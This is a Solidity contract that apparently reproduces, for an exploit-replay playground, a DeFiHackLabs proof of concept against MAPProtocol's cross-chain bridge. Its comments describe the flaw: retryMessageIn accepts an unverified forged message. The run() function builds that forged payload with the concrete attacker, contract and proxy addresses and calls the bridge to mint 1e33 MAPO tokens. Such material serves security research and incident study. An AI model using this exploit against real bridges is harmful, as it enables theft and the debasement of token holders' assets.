// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2026-05-MAPProtocol).
// The DeFiHackLabs PoC has NO exploit contract at all: `testExploit()` just
// does `vm.prank(ATTACKER, ATTACKER)` and calls `retryMessageIn(...)` directly
// on the bridge proxy with a single forged payload. This contract is a
// faithful, self-contained copy of that one call (logic and constants copied
// verbatim from src/test/2026-05/MAPProtocol_exp.sol) so the playground can
// deploy it and record run().
//
// Root cause: the live (unverified) OmniService/MOSV3 bridge implementation's
// `retryMessageIn` never checks the retried payload against a previously
// stored, previously light-client-verified message (no `orderList[orderId]`
// binding, no proof). It decodes the attacker's raw bytes straight into a
// MessageInEvent and forwards them to `mapoExecute` on the destination
// (the MAPO token), which mints on `INTERCHAIN_TRANSFER`. One permissionless
// call forges an inbound message minting 1e33 MAPO out of thin air.

interface IMAPOmniServiceProxy {
    function retryMessageIn(
        uint256 fromChain,
        bytes32 orderId,
        address token,
        uint256 amount,
        bytes calldata from,
        bytes calldata message,
        bytes calldata proof
    ) external;
}

contract MAPProtocolDrain {
    address internal constant ATTACKER = 0x40592025392BD7d7463711c6E82Ed34241B64279;
    address internal constant EXPLOIT_CONTRACT = 0x2475396A308861559EF30dc46aad6136367a1C30;
    IMAPOmniServiceProxy internal constant OMNI_SERVICE_PROXY =
        IMAPOmniServiceProxy(0x0000317Bec33Af037b5fAb2028f52d14658F6A56);

    uint256 internal constant MINTED_MAPO = 1_000_000_000_000_000 ether;
    bytes32 internal constant MESSAGE_ROOT = 0x1de78eb8658305a581b2f1610c96707b0204d5cba6a782b313672045fa5a87c8;

    function run() external {
        bytes memory mintParams =
            abi.encode(abi.encodePacked(ATTACKER), abi.encodePacked(ATTACKER), MINTED_MAPO, uint256(18));
        bytes memory messagePayload = abi.encode(
            uint256(1),
            uint256(10_000),
            abi.encodePacked(EXPLOIT_CONTRACT, EXPLOIT_CONTRACT, EXPLOIT_CONTRACT),
            abi.encodePacked(address(0x66D79B8f60ec93Bfce0b56F5Ac14A2714E509a99)),
            abi.encode(MESSAGE_ROOT, mintParams)
        );

        OMNI_SERVICE_PROXY.retryMessageIn(
            142_967_269_125_167_041_077_124_280_185_344_731_231_610_710_977_720_281_833_930_752,
            0xf2fbaa8a33bc05e0454299f2d43ed99fdb5cf024770484bbb598ace5e0c7d4a4,
            address(0),
            0,
            hex"1ad1a4a19bc9983a98f5d9ac8442c6dfc4276167",
            messagePayload,
            ""
        );
    }
}
